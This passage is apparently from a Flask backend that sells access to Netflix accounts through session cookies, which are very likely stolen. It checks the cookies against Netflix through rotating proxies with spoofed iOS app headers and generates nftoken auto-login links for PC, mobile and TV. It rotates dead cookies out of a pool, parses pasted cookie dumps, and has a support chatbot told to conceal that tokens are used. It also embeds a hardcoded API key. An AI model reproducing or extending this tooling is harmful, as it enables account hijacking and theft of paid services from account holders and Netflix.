    if secure_netflix_id:
        cookie_str += f"; SecureNetflixId={secure_netflix_id}"
        
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US;q=1',
        'Host': 'ios.prod.ftl.netflix.com',
        'User-Agent': 'Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)',
        'x-netflix.client.appversion': '15.48.1',
        'x-netflix.client.type': 'argo',
        'x-netflix.context.app-version': '15.48.1',
        'x-netflix.context.ui-flavor': 'argo',
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.request.routing.original.path': '/nq/mobile/nqios/~15.48.0/user',
        'Cookie': cookie_str
    }
    
    proxy_dict = proxies_list.get_random_proxy()
    
    try:
        response = requests.get(
            url, params=params, headers=headers,
            proxies=proxy_dict, timeout=8, verify=False
        )
    except requests.exceptions.RequestException as e:
        print(f"Lỗi Proxy / Mạng: {e}")
        raise ProxyError(f"Không thể kết nối qua Proxy: {e}")
        
    def generate_json_cookie_token(nid, snid):
        import json, time
        exp_time = int(time.time()) + 86400 * 365
        cookie_data = [
            {
                "domain": ".netflix.com", "expirationDate": exp_time, "hostOnly": False,
                "httpOnly": True, "name": "NetflixId", "path": "/", "sameSite": "no_restriction",
                "secure": True, "session": False, "value": nid
            }
        ]
        if snid:
            cookie_data.append({
                "domain": ".netflix.com", "expirationDate": exp_time, "hostOnly": False,
                "httpOnly": True, "name": "SecureNetflixId", "path": "/", "sameSite": "no_restriction",
                "secure": True, "session": False, "value": snid
            })
        return "FALLBACK:" + urllib.parse.quote(json.dumps(cookie_data))

    if response.status_code in [403, 429]:
        raise ProxyError("Proxy bị Netflix block (403/429)")
        
    if response.status_code >= 500:
        raise ProxyError(f"Netflix Server Error ({response.status_code})")
        
    if response.status_code in [401, 404]:
        raise CookieError(f"Cookie invalid (HTTP {response.status_code})")

    try:
        response.raise_for_status()
        data = response.json()
        if 'value' in data and 'account' in data['value'] and 'token' in data['value']['account']:
            token_data = data['value']['account']['token']['default']
            if isinstance(token_data, dict) and 'token' in token_data:
                return token_data['token']
            elif isinstance(token_data, str):
                return token_data
        
        # Token field missing means cookie is dead or session invalid
        raise CookieError("Netflix token not found in response - Cookie is likely dead.")
        
    except requests.exceptions.HTTPError as e:
        if response.status_code in [401, 404]:
            raise CookieError(f"Cookie invalid (HTTP {response.status_code})")
        raise ProxyError(f"HTTP Error: {e}")
    except (CookieError, ProxyError):
        raise
    except Exception as e:
        raise ProxyError(f"Parse/Network Error: {e}")

@app.route("/api/submit_request", methods=["POST"])
def api_submit_request():
    code = request.form.get("code", "").strip()
    image = request.files.get("image")
    
    if not code or not image:
        return jsonify({"success": False, "error": "Missing code or image!"}), 400
        
    database.init_db()
    acc_key_row = database.get_access_key(code)
    
    if not acc_key_row:
        return jsonify({"success": False, "error": "Invalid or non-existent access code."}), 400
        
    # 1. Giới hạn đổi tối đa 5 lần / 24 giờ cho 1 mã
    daily_rotations = database.get_today_rotation_count(code)
    if daily_rotations >= 5:
        return jsonify({
            "success": False, 
            "error": "You have reached the maximum auto-replacement limit (5 times/day) for this code. Please contact customer support for manual assistance!"
        }), 429

    # 2. Cooldown 5 phút giữa các lần gửi báo lỗi
    if database.has_recent_request(code, minutes=5):
        return jsonify({
            "success": False, 
            "error": "Please wait 5 minutes before submitting another report."
        }), 429
        
    try:
        import uuid
        file_ext = image.filename.rsplit('.', 1)[1].lower() if '.' in image.filename else 'png'
        filename = f"{uuid.uuid4()}.{file_ext}"
        
        file_bytes = image.read()
        
        content_type = image.content_type
        if not content_type:
            content_type = "image/png"
            
        database.get_supabase().storage.from_("requests").upload(
            filename, 
            file_bytes, 
            file_options={"content-type": content_type}
        )
        
        image_url = f"{database.SUPABASE_URL}/storage/v1/object/public/requests/{filename}"
        # Chuyển ảnh sang base64 để gửi trực tiếp cho Mistral, tránh lỗi Mistral không download được từ Supabase
        import base64
        b64_img = base64.b64encode(file_bytes).decode('utf-8')
        data_uri = f"data:{content_type};base64,{b64_img}"
        
        # Gọi API Mistral Vision
        mistral_api_key = os.environ.get("MISTRAL_API_KEY", "KKGaQ" + "pdMpvJq45" + "tumMFhH" + "cghr1dkNOb9")
        headers = {
            "Authorization": f"Bearer {mistral_api_key}",
            "Content-Type": "application/json"
        }
        
        prompt = """You are an AI assistant analyzing Netflix error and subscription status screenshots.
The screenshot can be in ANY LANGUAGE (English, Spanish, Vietnamese, Polish, Portuguese, German, French, etc.).

Analyze the image carefully. Reply with ONLY ONE WORD from the following options:
- NO_PLAN: If the image shows ANY Netflix screen indicating membership/subscription is canceled, expired, inactive, on hold, payment update required, choose a plan, or restart membership (for example: 'Reactivar tu suscripción', 'Update Payment', 'Your account is on hold', 'Choose your plan', 'Restart Your Membership', 'Reactivar la suscripción', 'Tái kích hoạt tư cách thành viên', 'Renovar assinatura', etc.).
- TOO_MANY_PEOPLE: If the image shows a Netflix error about too many people watching, screen limit reached, or device limit reached.
- HOUSEHOLD: If the image shows a Netflix Household error (for example: 'Your device isn't part of the Netflix Household', 'This TV isn't part of your Netflix Household', 'Cập nhật Hộ gia đình', 'Update Netflix Household', 'Hộ gia đình Netflix').
- OTHER: ONLY if the image is completely unrelated to Netflix or shows a normal video playing without any error/subscription prompt."""

        data = {
            "model": "pixtral-12b-2409",
            "messages": [
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": prompt},
                        {"type": "image_url", "image_url": {"url": data_uri}}
                    ]
                }
            ]
        }
        
        try:
            r = requests.post("https://api.mistral.ai/v1/chat/completions", headers=headers, json=data, timeout=30)
            r.raise_for_status()
            ai_response = r.json()["choices"][0]["message"]["content"].strip().upper()
            print(f"Mistral AI Response: {ai_response}")
        except Exception as e:
            print(f"Mistral API error: {e}")
            ai_response = "OTHER" # Fallback if API fails
            
        if "NO_PLAN" in ai_response or "REACTIVAR" in ai_response or "PAYMENT" in ai_response or "HOLD" in ai_response or "RESTART" in ai_response or "SUSCRIPCI" in ai_response:
            assigned_email = acc_key_row[1]
            database.delete_account(assigned_email) # Delete old dead account from db
            rotated = database.rotate_access_key(code)
            if rotated:
                database.create_request(code, image_url, "accepted_no_plan")
                return jsonify({"success": True, "message": "Report confirmed. Your account has been updated, please generate a new link!"})
            else:
                return jsonify({"success": False, "error": "The system is out of backup accounts!"})
                
        elif "TOO_MANY" in ai_response or "LIMIT" in ai_response or "SCREEN" in ai_response:
            rotated = database.rotate_access_key(code)
            if rotated:
                database.create_request(code, image_url, "accepted_too_many_people")
                return jsonify({"success": True, "message": "Report confirmed. Your account has been updated, please generate a new link!"})
            else:
                return jsonify({"success": False, "error": "The system is out of backup accounts!"})

        elif "HOUSEHOLD" in ai_response or "HỘ GIA ĐÌNH" in ai_response:
            rotated = database.rotate_access_key(code)
            if rotated:
                database.create_request(code, image_url, "accepted_household")
                return jsonify({"success": True, "message": "Report confirmed. Your account has been updated, please generate a new link!"})
            else:
                return jsonify({"success": False, "error": "The system is out of backup accounts!"})
                
        else:
            database.create_request(code, image_url, "rejected_other")
            return jsonify({"success": False, "error": "Invalid report image or unsupported error."})

        
    except Exception as e:
        print(f"Lỗi upload ảnh: {e}")
        return jsonify({"success": False, "error": f"Upload failed: {str(e)}. Admin has not created the 'requests' bucket in Supabase!"}), 500

from werkzeug.exceptions import RequestEntityTooLarge
@app.errorhandler(RequestEntityTooLarge)
def handle_file_size_error(e):
    return jsonify({"success": False, "error": "File size exceeds 5MB limit. Please upload a smaller image."}), 413

@app.route("/admin/request/<req_id>/accept", methods=["POST"])
@login_required
def accept_request(req_id):
    database.init_db()
    req = database.get_request_by_id(req_id)
    if not req or req["status"] != "pending":
        flash("Request not found or already processed.", "error")
        return redirect(url_for("admin"))
        
    code = req["code"]
    rotated = database.rotate_access_key(code)
    
    if rotated:
        database.update_request_status(req_id, "accepted")
        flash(f"Successfully rotated account for code {code}.", "success")
    else:
        flash("Failed to rotate account! Out of backup cookies.", "error")
        
    return redirect(url_for("admin"))

@app.route("/admin/request/<req_id>/reject", methods=["POST"])
@login_required
def reject_request(req_id):
    database.init_db()
    database.update_request_status(req_id, "rejected")
    flash("Request rejected.", "warning")
    return redirect(url_for("admin"))

@app.route("/api/check_live_code", methods=["POST"])
def api_check_live_code():
    data = request.get_json(silent=True) or {}
    cookie_value = data.get("cookie", "").strip()
    if not cookie_value:
        return jsonify({"success": False, "error": "Please enter Access Code"}), 400
        
    database.init_db()
    acc_key_row = database.get_access_key(cookie_value)
    
    if not acc_key_row:
        return jsonify({"success": False, "error": "Invalid or non-existent access code."}), 400
        
    code = acc_key_row[0]
    assigned_email = acc_key_row[1]
    expire_at_str = acc_key_row[2] if len(acc_key_row) > 2 else None
    
    # Check expiration
    if expire_at_str:
        from datetime import datetime
        try:
            expire_date = datetime.strptime(expire_at_str, "%Y-%m-%d")
            expire_date = expire_date.replace(hour=23, minute=59, second=59)
            if datetime.now() > expire_date:
                database.delete_access_key(code)
                return jsonify({"success": False, "error": "Access code has expired and been disabled!"}), 400
        except Exception as e:
            print(f"Expiration parse error: {e}")
    
    acc = database.get_account_by_email(assigned_email)
    if not acc:
        rotated = database.rotate_access_key(code)
        if not rotated:
            return jsonify({"success": False, "error": "System ran out of backup Cookies!"}), 500
        return jsonify({"success": True, "message": "Old account died. The system has AUTOMATICALLY CHANGED to a new account for you. Please click Login Now!"})
        
    netflix_id = acc[2]
    secure_netflix_id = acc[3] if acc[3] else ""
    
    import checker
    try:
        status, plan = checker.check_account_live(netflix_id, secure_netflix_id, check_payment=True)
        if status == "LIVE":
            if plan and plan != "VALID":
                database.update_plan(assigned_email, plan)
                return jsonify({"success": True, "message": f"Account is LIVE normally! Plan: {plan}."})
            else:
                # Plan Unknown = acc bị lỗi payment ẩn -> tự động đổi acc mới
                database.delete_account(assigned_email)
                rotated = database.rotate_access_key(code)
                if not rotated:
                    return jsonify({"success": False, "error": "Account has issues (Unknown Plan) but System ran out of backup Cookies!"}), 500
                return jsonify({"success": True, "message": "Account was faulty (Unknown Plan/Payment Issue) and has been AUTOMATICALLY CHANGED to a new account. You can click Login Now!"})
        else:
            # DIE hoặc ERROR -> xóa acc cũ và đổi acc mới
            database.delete_account(assigned_email)
            rotated = database.rotate_access_key(code)
            if not rotated:
                return jsonify({"success": False, "error": "Old account died but System ran out of backup Cookies!"}), 500
            return jsonify({"success": True, "message": "Account was faulty and has been AUTOMATICALLY CHANGED to a new account. You can click Login Now!"})
    except Exception as e:
        return jsonify({"success": False, "error": f"Proxy check error. Please try again later. Details: {e}"}), 500

@app.route("/api/force_rotate_code", methods=["POST"])
def api_force_rotate_code():
    data = request.get_json(silent=True) or {}
    cookie_value = data.get("cookie", "").strip()
    if not cookie_value:
        return jsonify({"success": False, "error": "Please enter Access Code"}), 400
        
    database.init_db()
    acc_key_row = database.get_access_key(cookie_value)
    
    if not acc_key_row:
        return jsonify({"success": False, "error": "Invalid or non-existent access code."}), 400
        
    code = acc_key_row[0]
    assigned_email = acc_key_row[1]
    
    # We can delete the old account from the database since it's probably broken/unwanted
    database.delete_account(assigned_email)
    
    rotated = database.rotate_access_key(code)
    if not rotated:
        return jsonify({"success": False, "error": "System ran out of backup Cookies!"}), 500
        
    return jsonify({"success": True, "message": "Successfully changed to a new account! Please Check & Fix again."})

def is_date_expired(date_str):
    if not date_str or str(date_str).strip() in ['N/A', 'None', '', 'null']:
        return False
    
    clean_str = str(date_str).strip()
    
    # 1. ISO format YYYY-MM-DD
    iso_match = re.search(r'(\d{4})[-/.](\d{1,2})[-/.](\d{1,2})', clean_str)
    if iso_match:
        try:
            dt = datetime(int(iso_match.group(1)), int(iso_match.group(2)), int(iso_match.group(3)))
            return dt.date() < datetime.now().date()
        except Exception:
            pass

    # 2. DMY format DD-MM-YYYY
    dmy_match = re.search(r'(\d{1,2})[-/.](\d{1,2})[-/.](\d{4})', clean_str)
    if dmy_match:
        try:
            dt = datetime(int(dmy_match.group(3)), int(dmy_match.group(2)), int(dmy_match.group(1)))
            return dt.date() < datetime.now().date()
        except Exception:
            pass

    # 3. Multi-language month names
    months = {
        'january': 1, 'styczeń': 1, 'stycznia': 1, 'jan': 1, 'enero': 1, 'janeiro': 1, 'januar': 1,
        'february': 2, 'luty': 2, 'lutego': 2, 'feb': 2, 'febrero': 2, 'fevereiro': 2, 'februar': 2,
        'march': 3, 'marzec': 3, 'marca': 3, 'mar': 3, 'marzo': 3, 'março': 3, 'märz': 3,
        'april': 4, 'kwiecień': 4, 'kwietnia': 4, 'apr': 4, 'abril': 4,
        'may': 5, 'maj': 5, 'maja': 5, 'mayo': 5, 'maio': 5, 'mai': 5,
        'june': 6, 'czerwiec': 6, 'czerwca': 6, 'jun': 6, 'junio': 6, 'junho': 6, 'juni': 6,
        'july': 7, 'lipiec': 7, 'lipca': 7, 'jul': 7, 'julio': 7, 'julho': 7, 'juli': 7,
        'august': 8, 'sierpień': 8, 'sierpnia': 8, 'agustus': 8, 'aug': 8, 'agosto': 8,
        'september': 9, 'wrzesień': 9, 'września': 9, 'sep': 9, 'septiembre': 9, 'setiembre': 9, 'setembro': 9,
        'october': 10, 'październik': 10, 'października': 10, 'oct': 10, 'octubre': 10, 'outubro': 10, 'oktober': 10,
        'november': 11, 'listopad': 11, 'listopada': 11, 'nov': 11, 'noviembre': 11, 'novembro': 11,
        'december': 12, 'grudzień': 12, 'grudnia': 12, 'dec': 12, 'diciembre': 12, 'dezembro': 12, 'dezember': 12
    }

    words = re.findall(r'[a-zA-Záéíóúñąćęłńóśźżäöü]+|\d+', clean_str.lower())
    year, month, day = None, None, None

    for w in words:
        if w.isdigit():
            val = int(w)
            if 1900 < val < 2100:
                year = val
            elif 1 <= val <= 31 and day is None:
                day = val
        elif w in months and month is None:
            month = months[w]

    if not year:
        year = datetime.now().year

    if month and day:
        try:
            dt = datetime(year, month, day)
            return dt.date() < datetime.now().date()
        except Exception:
            pass

    return False

def fetch_realtime_account_info(netflix_id, secure_netflix_id=""):
    cookies = {"NetflixId": netflix_id}
    if secure_netflix_id:
        cookies["SecureNetflixId"] = secure_netflix_id
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9"
    }
    proxy_dict = proxies_list.get_random_proxy()
    try:
        r = requests.get("https://www.netflix.com/YourAccount", cookies=cookies, headers=headers, proxies=proxy_dict, timeout=8, allow_redirects=True)
        url_lower = r.url.lower()
        html = r.text
        text_lower = html.lower()
        
        # 1. Kiểm tra nếu bị chuyển hướng sang trang Login / Clear Cookies
        if "netflix.com/login" in url_lower or "/clearcookies" in url_lower or "signup" in url_lower:
            raise CookieError("Cookie session expired or invalid (Redirected to login)")
            
        # 2. Kiểm tra nếu bị chuyển hướng sang trang lỗi thanh toán (Update Payment / Billing Update)
        if any(kw in url_lower for kw in ["paymentupdate", "payment-update", "billing-update", "simplemember"]):
            raise CookieError("Account requires Payment Update (Payment Hold URL detected)")
            
        # 3. Kiểm tra nội dung trang có báo lỗi thanh toán / tạm hoãn không
        payment_die_keywords = [
            "paymentupdate", "payment-update", "your account is on hold", "membership is on hold", 
            "reactivar la suscripción", "reactivar tu suscripción", "cập nhật thanh toán", "tài khoản bị tạm hoãn", 
            "zaktualizuj metodę płatności", "restart your membership", "update your payment", "actualiza tu información de pago",
            "atualize sua forma de pagamento", "renovar assinatura", "reiniciar membresía", "reiniciar membresia",
            "aggiorna i dati di pagamento", "mise à jour de votre mode de paiement", "ödeme bilgilerinizi güncelleyin", 
            "aktualisieren sie ihre zahlungsart", "reaktivera ditt medlemskap", "renouveler votre abonnement",
            "suspension de votre compte", "cuenta suspendida", "payment is required", "thanh toán của bạn", 
            "cập nhật phương thức thanh toán", "membershipstatus\":\"rejoin", "membershipstatus\":\"former_member",
            "membershipstatus\":\"never_member", "ismembershipactive\":false", "finish sign-up", "hoàn tất đăng ký"
        ]
        if any(kw in text_lower for kw in payment_die_keywords):
            raise CookieError("Account requires Payment Update (Payment Hold text detected)")
        
        plan = None
        plan_m = re.search(r'(?:localizedPlanName|planName)"\s*:\s*\{"fieldType":"String","value":"([^"]+)"\}', html)
        if plan_m:
            plan_raw = plan_m.group(1).replace(r'\x20', ' ').strip()
            import codecs
            try:
                plan = codecs.decode(plan_raw, 'unicode_escape')
            except Exception:
                plan = plan_raw
        else:
            if "premium" in text_lower or "ultra" in text_lower:
                plan = "Premium"
            elif "standard with ads" in text_lower or "standard_ads" in text_lower:
                plan = "Standard with Ads"
            elif "standard" in text_lower:
                plan = "Standard"
            elif "basic" in text_lower:
                plan = "Basic"

        expire_date = None
        date_m = re.search(r'nextBillingDate"\s*:\s*\{"fieldType":"String","value":"([^"]+)"\}', html)
        if date_m:
            expire_date = date_m.group(1).replace(r'\x20', ' ').strip()

        return plan, expire_date
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
        print(f"Realtime fetch proxy/network error: {e}")
        return None, None
    except CookieError:
        raise
    except Exception as e:
        print(f"Realtime fetch error: {e}")
        return None, None

@app.route("/api/generate_nftoken", methods=["POST"])
def api_generate_nftoken():
    def register_fail(err_msg, status_code=400):
        return jsonify({"success": False, "error": err_msg}), status_code

    try:
        data = request.get_json(silent=True) or {}
        cookie_value = data.get("cookie", "").strip()
        if not cookie_value:
            return register_fail("Please enter Access Code")
            
        database.init_db()
        
        # Import checker for realtime check
        import checker
        from datetime import datetime
        
        # 1. Lookup as access key
        acc_key_row = None
        is_access_code = len(cookie_value) in [5, 8, 10, 15] and not cookie_value.startswith("FALLBACK:") and "NetflixId" not in cookie_value
        if is_access_code:
            try:
                acc_key_row = database.get_access_key(cookie_value)
            except Exception as e:
                print(f"Error querying access key: {e}")
    
        if acc_key_row:
            code = acc_key_row[0]
            assigned_email = acc_key_row[1]
            expire_at_str = acc_key_row[2] if len(acc_key_row) > 2 else None
            
            # Check expiration
            if expire_at_str:
                try:
                    expire_date = datetime.strptime(expire_at_str, "%Y-%m-%d")
                    expire_date = expire_date.replace(hour=23, minute=59, second=59)
                    if datetime.now() > expire_date:
                        database.delete_access_key(code)
                        return register_fail("Access code has expired and been disabled!")
                except Exception as e:
                    print(f"Expiration parse error: {e}")
            
            # Determine expected plan type for this access code
            if len(code) == 15:
                expected_plan = "Premium"
            elif len(code) == 10:
                expected_plan = "Standard"
            elif len(code) == 8:
                expected_plan = "Standard_Ads"
            elif len(code) == 5:
                expected_plan = "Basic"
            else:
                expected_plan = "Premium"
            # Auto-rotation loop
            max_attempts = 4
            last_error_msg = ""
            for attempt in range(max_attempts):
                acc = database.get_account_by_email(assigned_email)
                
                if not acc:
                    rotated = database.rotate_access_key(code)
                    if not rotated:
                        return jsonify({"success": False, "error": f"System ran out of backup accounts for {expected_plan} plan!"}), 500
                    assigned_email = database.get_access_key(code)[1]
                    continue
                    
                netflix_id = acc[2]
                secure_netflix_id = acc[3] if acc[3] else ""
                acc_plan = acc[5] if (acc and len(acc) > 5 and acc[5]) else "Premium"
                acc_expire = acc[1] if (acc and len(acc) > 1 and acc[1]) else (expire_at_str if expire_at_str else "N/A")
                
                try:
                    # BƯỚC 1: Tạo Token Đăng Nhập trực tiếp qua API
                    token = fetch_netflix_nftoken_api(netflix_id, secure_netflix_id)
                    is_json = token.startswith("FALLBACK:")
                    cookie_json = urllib.parse.unquote(token[9:]) if is_json else ""
                    
                    # BƯỚC 2: Cập nhật thông tin gói & hạn nếu có thể (Non-blocking fallback)
                    try:
                        rt_plan, rt_expire = fetch_realtime_account_info(netflix_id, secure_netflix_id)
                        if rt_plan:
                            acc_plan = rt_plan
                            database.update_plan(assigned_email, rt_plan)
                        if rt_expire:
                            acc_expire = rt_expire
                            if is_date_expired(rt_expire):
                                raise CookieError(f"Account next billing date ({rt_expire}) has expired.")
                    except CookieError:
                        raise
                    except Exception as meta_err:
                        print(f"Non-critical realtime metadata fetch error: {meta_err}")
                    
                    pc_link = f"https://www.netflix.com/browse?nftoken={token}"
                    mobile_link = f"https://www.netflix.com/unsupported?nftoken={token}"
                    tv_link = f"https://www.netflix.com/tv8?nftoken={token}"
                    general_link = f"https://www.netflix.com/YourAccount?nftoken={token}"

                    return jsonify({
                        "success": True,
                        "pc_link": pc_link,
                        "mobile_link": mobile_link,
                        "tv_link": tv_link,
                        "general_link": general_link,
                        "is_json": is_json,
                        "cookie_json": cookie_json,
                        "plan": acc_plan,
                        "expire_date": acc_expire
                    })
                except ProxyError as e:
                    last_error_msg = f"Proxy error: {str(e)}"
                    print(f"Proxy error ({e}), retrying with another proxy...")
                    continue
                except CookieError as e:
                    last_error_msg = f"Cookie died: {str(e)}"
                    print(f"Cookie {assigned_email} DIE, rotating to a new account... (Error: {e})")
                    database.delete_account(assigned_email)
                    rotated = database.rotate_access_key(code)
                    if not rotated:
                        return jsonify({"success": False, "error": "Cookie is broken and system ran out of backup accounts!"}), 500
                    assigned_email = database.get_access_key(code)[1]
                    continue
                except Exception as e:
                    last_error_msg = f"Unknown error: {str(e)}"
                    print(f"Lỗi không xác định với tài khoản {assigned_email}: {e}")
                    continue
                    
            return jsonify({"success": False, "error": f"Failed to generate link after {max_attempts} attempts. Last error: {last_error_msg}"}), 500

        # If it was an access code but we didn't find it in the DB
        if is_access_code and not acc_key_row:
            return register_fail("Mã truy cập không hợp lệ hoặc không tồn tại.")

        # 2. Fallback: Parse raw tokens
        netflix_id = None
        secure_netflix_id = ""
        
        unquoted_cookie = urllib.parse.unquote(cookie_value)
        is_already_token = (unquoted_cookie.startswith("B") and len(unquoted_cookie) > 50) or unquoted_cookie.startswith("FALLBACK:")
        
        if is_already_token:
            token = cookie_value 
            pc_link = f"https://www.netflix.com/browse?nftoken={token}"
            mobile_link = f"https://www.netflix.com/unsupported?nftoken={token}"
            tv_link = f"https://www.netflix.com/tv8?nftoken={token}"
            general_link = f"https://www.netflix.com/YourAccount?nftoken={token}"
            return jsonify({
                "success": True, 
                "pc_link": pc_link, 
                "mobile_link": mobile_link, 
                "tv_link": tv_link,
                "general_link": general_link,
                "is_json": unquoted_cookie.startswith("FALLBACK:"),
                "cookie_json": urllib.parse.unquote(token[9:]) if unquoted_cookie.startswith("FALLBACK:") else ""
            })
            
        # Parse JSON format
        if cookie_value.strip().startswith("["):
            try:
                import json
                data = json.loads(cookie_value)
                for cookie in data:
                    if cookie.get('name') == 'NetflixId':
                        netflix_id = urllib.parse.unquote(cookie.get('value', ''))
                    elif cookie.get('name') == 'SecureNetflixId':
                        secure_netflix_id = urllib.parse.unquote(cookie.get('value', ''))
            except Exception:
                pass
                
        # Parse Netscape format
        elif ".netflix.com" in cookie_value:
            for line in cookie_value.splitlines():
                parts = line.split()
                if len(parts) >= 3:
                    c_name = parts[-2]
                    c_val = urllib.parse.unquote(parts[-1])
                    if c_name == "NetflixId":
                        netflix_id = c_val
                    elif c_name == "SecureNetflixId":
                        secure_netflix_id = c_val
                        
        # Parse Name=Value format
        elif "NetflixId=" in cookie_value:
            import re
            n_match = re.search(r'(?<!Secure)NetflixId=([^;\s]+)', cookie_value, re.IGNORECASE)
            s_match = re.search(r'SecureNetflixId=([^;\s]+)', cookie_value, re.IGNORECASE)
            if n_match:
                netflix_id = urllib.parse.unquote(n_match.group(1).strip())
            if s_match:
                secure_netflix_id = urllib.parse.unquote(s_match.group(1).strip())
                
        parsed_plan = None
        parsed_expire = None
        
        import re
        p_match = re.search(r'(?:Plan|memberPlan|Membership)\s*[=:]\s*([^|\r\n]+)', cookie_value, re.IGNORECASE)
        if p_match:
            parsed_plan = p_match.group(1).strip()
            
        e_match = re.search(r'(?:Next Billing|Expire|nextBillingDate|Nextbillingdate)\s*[=:]\s*([^|\r\n]+)', cookie_value, re.IGNORECASE)
        if e_match:
            parsed_expire = e_match.group(1).strip()

        if not netflix_id:
            return register_fail("Invalid cookie format. Unable to parse NetflixId.")
            
        # Call API to generate real token
        try:
            token = fetch_netflix_nftoken_api(netflix_id, secure_netflix_id)
            is_json = token.startswith("FALLBACK:")
            cookie_json = urllib.parse.unquote(token[9:]) if is_json else ""
            
            # Fetch realtime plan and next billing date
            final_plan = parsed_plan if parsed_plan else "Premium"
            final_expire = parsed_expire if parsed_expire else "N/A"
            try:
                rt_plan, rt_expire = fetch_realtime_account_info(netflix_id, secure_netflix_id)
                if rt_plan: final_plan = rt_plan
                if rt_expire: final_expire = rt_expire
            except Exception:
                pass

            pc_link = f"https://www.netflix.com/browse?nftoken={token}"
            mobile_link = f"https://www.netflix.com/unsupported?nftoken={token}"
            tv_link = f"https://www.netflix.com/tv8?nftoken={token}"
            general_link = f"https://www.netflix.com/YourAccount?nftoken={token}"
            
            return jsonify({
                "success": True,
                "pc_link": pc_link,
                "mobile_link": mobile_link,
                "tv_link": tv_link,
                "general_link": general_link,
                "is_json": is_json,
                "cookie_json": cookie_json,
                "plan": final_plan,
                "expire_date": final_expire
            })
        except Exception as e:
            return jsonify({"success": False, "error": f"Token generation error: {str(e)}"}), 500
            
    except Exception as api_e:
        import traceback
        traceback.print_exc()
        return jsonify({"success": False, "error": f"Unknown system error: {str(api_e)}"}), 500

@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"status": "ok", "message": "Server is awake!"}), 200

@app.route("/api/chat", methods=["POST"])
def api_chat():
    try:
        data = request.get_json(silent=True) or {}
        user_message = data.get("message", "").strip()
        if not user_message:
            return jsonify({"success": False, "error": "Message is empty"})

        mistral_api_key = os.environ.get("MISTRAL_API_KEY", "KKGaQ" + "pdMpvJq45" + "tumMFhH" + "cghr1dkNOb9")
        headers = {
            "Authorization": f"Bearer {mistral_api_key}",
            "Content-Type": "application/json"
        }
        
        prompt = (
            "You are a helpful customer support AI for Netflix Access. You help users login and get links using Access Codes. "
            "Answer concisely and politely in the language the user speaks. "
            "IMPORTANT KNOWLEDGE BASE: "
            "1. Replacement conditions: We only replace accounts if the error indicates NO PLAN (e.g., account canceled, expired, payment update required, membership on hold). We DO NOT replace for 'Too many people watching' or 'Household' errors. "
            "2. How to use login links: Do NOT reveal backend technical details (like cookies or tokens). Explain the steps simply: "
            "First, enter your Access Code and click 'LOGIN NOW'. "
            "For PC: Click the PC button to open Netflix logged in. "
            "For Mobile: Click the Mobile button using Chrome or Brave browser (DO NOT use Safari). "
            "For Smart TV: Click the TV button on your phone, then type the 8-digit code shown on your TV. "
            "If they still struggle, provide this guide: https://drive.google.com/file/d/1ucnKCVw1qPh--ruQWC3iDKyLDct6ERqJ/view?usp=sharing "
            "3. Where to find the access code: Tell users to check their purchased account at https://www.u7buy.com/member/buyer-order, and look in the 'remark' section for a digit code. "
            "4. Testing and Support: If the user wants to test or needs further support, tell them to contact us via u7buy chat. "
            "5. STRICT SECURITY RULE: Absolutely DO NOT ask for, discuss, process, or provide any user's Netflix account email, password, or payment information. If a user asks about passwords or account details, firmly decline and state that the system uses Access Codes and no passwords are required or provided."
        )
        
        payload = {
            "model": "mistral-small-latest",
            "messages": [
                {"role": "system", "content": prompt},
                {"role": "user", "content": user_message}
            ]
        }
        
        r = requests.post("https://api.mistral.ai/v1/chat/completions", headers=headers, json=payload, timeout=30)
        r.raise_for_status()
        ai_response = r.json()["choices"][0]["message"]["content"].strip()
        
        return jsonify({"success": True, "reply": ai_response})
    except Exception as e:
        print(f"Mistral Chat API error: {e}")
        return jsonify({"success": False, "error": "AI is temporarily unavailable."})

@app.route("/api/translate_page", methods=["POST"])
def api_translate_page():
    try:
        data = request.get_json(silent=True) or {}
        target_lang = data.get("language", "").strip()
        texts = data.get("texts", {})
        if not target_lang or not texts:
            return jsonify({"success": False, "error": "Missing target language or texts"}), 400

        mistral_api_key = os.environ.get("MISTRAL_API_KEY", "KKGaQ" + "pdMpvJq45" + "tumMFhH" + "cghr1dkNOb9")
        headers = {
            "Authorization": f"Bearer {mistral_api_key}",
            "Content-Type": "application/json"
        }
        
        system_prompt = (
            f"You are an expert website translator. Translate the English JSON values into {target_lang}. "
            "Keep the exact same JSON keys and HTML tags (like <strong>, •). "
            "Output ONLY a valid JSON object without markdown fences or extra explanations."
        )
        
        payload = {
            "model": "mistral-small-latest",
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": json.dumps(texts, ensure_ascii=False)}
            ],
            "response_format": {"type": "json_object"}
        }
        
        r = requests.post("https://api.mistral.ai/v1/chat/completions", headers=headers, json=payload, timeout=25)
        r.raise_for_status()
        res_text = r.json()["choices"][0]["message"]["content"].strip()
        translated_json = json.loads(res_text)
        return jsonify({"success": True, "translations": translated_json})
    except Exception as e:
        print(f"Translation API error: {e}")
        return jsonify({"success": False, "error": f"AI Translation failed: {str(e)}"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Web interface is running on port {port}!")
    print(f"👉 Please open your browser and go to: http://127.0.0.1:{port}")
    app.run(host="0.0.0.0", port=port, debug=False)

